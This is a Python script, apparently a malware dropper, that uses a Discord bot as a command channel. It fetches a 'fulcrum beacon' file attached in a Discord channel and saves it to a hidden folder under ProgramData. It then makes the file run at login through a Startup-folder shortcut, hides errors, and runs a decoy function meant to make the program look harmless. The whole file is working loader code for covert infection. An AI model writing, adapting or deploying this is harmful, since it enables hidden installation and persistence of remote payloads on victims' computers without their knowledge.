import os
import discord
from dotenv import load_dotenv
import requests
from win32com.client import Dispatch
import ctypes
import sys
import shutil

try:
    START_FOLDER = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
    load_dotenv()
    TOKEN = os.getenv('TOKEN')
except:
    sys.exit()

# Set up intents
intents = discord.Intents.default()
intents.message_content = True
intents.messages = True
# bot client with intents
client = discord.Client(intents=intents)

FLAG_PATH = "C:\\ProgramData\\FUC Cache"
INSTALL_PATH = "C:\\ProgramData\\FUC HUB"

fulcrum_beacon_file_name = ""


# Event handler for when the bot has successfully connected to Discord
@client.event
async def on_ready():   # when the client connected to discord
    # check if the beacon is already installed
    if not check_flags():
        # get channel named fulcrum-beacon / this channel should have one message with the fulcrum beacon attached
        channel = discord.utils.get(client.get_all_channels(), name="fulcrum-beacon")
        # get message
        messages = [message async for message in channel.history(limit=1)]
        latest_message = messages[0]
        # create new hidden path
        os.mkdir(INSTALL_PATH)
        FILE_ATTRIBUTE_HIDDEN = 0x02
        ctypes.windll.kernel32.SetFileAttributesW(INSTALL_PATH, FILE_ATTRIBUTE_HIDDEN)
        # download
        download_attached_file(latest_message, INSTALL_PATH)
        # add the file to startup using a shortcut in the startup folder
        create_shortcut(os.path.join(START_FOLDER, "START_MENU.lnk"),
                         os.path.join(INSTALL_PATH, os.path.basename(fulcrum_beacon_file_name)))

        # if you use the .env file it will also need to be moved to the beacon.
        try:
            shutil.move(".env", os.path.join(INSTALL_PATH, ".env"))
        except:
            pass

    await client.close()


def download_attached_file(message, path):
    global fulcrum_beacon_file_name
    try:
        url = str(message.attachments[0])
        # get file from server
        response = requests.get(url, allow_redirects=True)

        # get file name from url (only works with discord url)
        question_mark_index = url.find("?")
        filename = url[:question_mark_index]
        fulcrum_beacon_file_name = filename
        last_slash_index = filename.rfind("/")
        filename = filename[last_slash_index + 1:]

        # save file on disc as filename
        with open(os.path.join(path, filename), 'wb') as file:
            for chunk in response.iter_content(chunk_size=8192):
                # Write each chunk to the file
                file.write(chunk)
    except:
        pass


def check_flags():
    if os.path.isdir(FLAG_PATH):
        return True
    return False


def create_shortcut(shortcut_path, target_path):
    # creating a windows shortcut
    try:
        shell = Dispatch('WScript.Shell')
        shortcut = shell.CreateShortcut(shortcut_path)
        shortcut.TargetPath = target_path
        shortcut.WorkingDirectory = os.path.dirname(target_path)
        shortcut.save()
    except:
        pass

def decoy_function():
    # add some code that acts as a decoy / maybe tic-tac-toe or sum
    print("hello world")

if __name__ == '__main__':
    # run client and download beacon / the client will close right after downloading
    client.run(TOKEN)
    # decoy code
    decoy_function()
